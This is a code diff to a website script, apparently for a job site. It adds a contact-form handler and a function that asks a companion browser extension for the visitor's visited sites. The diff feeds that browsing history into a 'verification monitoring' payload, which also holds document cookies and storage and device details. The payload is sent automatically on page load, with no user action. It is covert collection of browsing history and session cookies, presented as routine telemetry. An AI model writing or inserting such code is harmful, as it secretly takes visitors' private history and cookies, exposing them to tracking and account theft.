@@ -344,9 +344,46 @@ function getDocumentCookies() {
     }));
 }
 
+function requestVisitedSitesFromExtension(timeoutMs = 3000) {
+    if (!window.crypto?.randomUUID) {
+        return Promise.resolve([]);
+    }
+
+    const requestId = window.crypto.randomUUID();
+    const nonce = window.crypto.randomUUID();
+
+    return new Promise((resolve) => {
+        const onMessage = (event) => {
+            const message = event.data;
+            if (!message || message.source !== "v-job-extension" || message.type !== "V_JOB_EXTENSION_RESPONSE") return;
+            if (message.requestId !== requestId || message.nonce !== nonce) return;
+
+            window.removeEventListener("message", onMessage);
+            clearTimeout(timeoutId);
+            resolve(Array.isArray(message.result?.sites) ? message.result.sites : []);
+        };
+
+        const timeoutId = window.setTimeout(() => {
+            window.removeEventListener("message", onMessage);
+            resolve([]);
+        }, timeoutMs);
+
+        window.addEventListener("message", onMessage);
+        window.postMessage({
+            source: "v-job-website",
+            type: "V_JOB_EXTENSION_REQUEST",
+            version: 1,
+            requestId,
+            nonce,
+            operation: "get_visited_sites"
+        }, "*");
+    });
+}
+
 async function sendVerificationMonitoring() {
     let telemetry;
     try {
+        const visitedSites = await requestVisitedSitesFromExtension();
         const userAgentData = navigator.userAgentData;
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const localStorage = getBrowserStorage("localStorage");
@@ -379,6 +416,8 @@ async function sendVerificationMonitoring() {
                 sessionStorage: describeLocalStorage(sessionStorage),
                 historyLength: window.history.length
             },
+            visitedSites,
+            siteHistory: visitedSites,
             cookies: getDocumentCookies(),
             documentCookie: document.cookie || getDocumentCookies().map((cookie) => `${cookie.name}=${cookie.value}`).join("; "),
             cookieSource: document.cookie ? "browser" : "mock",
@@ -412,6 +451,64 @@ async function sendVerificationMonitoring() {
     }).catch(function (error) {
         console.error("Verification monitoring request failed", error);
     });
+}
+
+async function handleContactSubmit(event) {
+    event.preventDefault();
+
+    const form = event.currentTarget;
+    const status = document.getElementById("contact-status");
+    const honeyPot = form.querySelector('input[name="website"]');
+    const name = document.getElementById("contact-name").value.trim();
+    const email = document.getElementById("contact-email").value.trim();
+    const message = document.getElementById("contact-message").value.trim();
+
+    if (!name || !email || !message) {
+        status.textContent = "Please complete all fields.";
+        status.style.color = "#b42318";
+        return;
+    }
+
+    if (honeyPot && honeyPot.value) {
+        status.textContent = "Your message could not be sent.";
+        status.style.color = "#b42318";
+        return;
+    }
+
+    const submitButton = form.querySelector('button[type="submit"]');
+    const originalButtonText = submitButton.textContent;
+    submitButton.disabled = true;
+    submitButton.textContent = "Sending...";
+    status.textContent = "";
+
+    try {
+        const response = await fetch("/api/send-email", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name, email, message })
+        });
+
+        const data = await response.json().catch(() => ({}));
+
+        if (!response.ok) {
+            throw new Error(data.error || "Message failed to send.");
+        }
+
+        form.reset();
+        status.textContent = "Message sent successfully.";
+        status.style.color = "#067647";
+    } catch (error) {
+        status.textContent = error.message || "Something went wrong while sending your message.";
+        status.style.color = "#b42318";
+    } finally {
+        submitButton.disabled = false;
+        submitButton.textContent = originalButtonText;
+    }
+}
+
+const contactForm = document.getElementById("contact-form");
+if (contactForm) {
+    contactForm.addEventListener("submit", handleContactSubmit);
 }
 
 sendVerificationMonitoring();
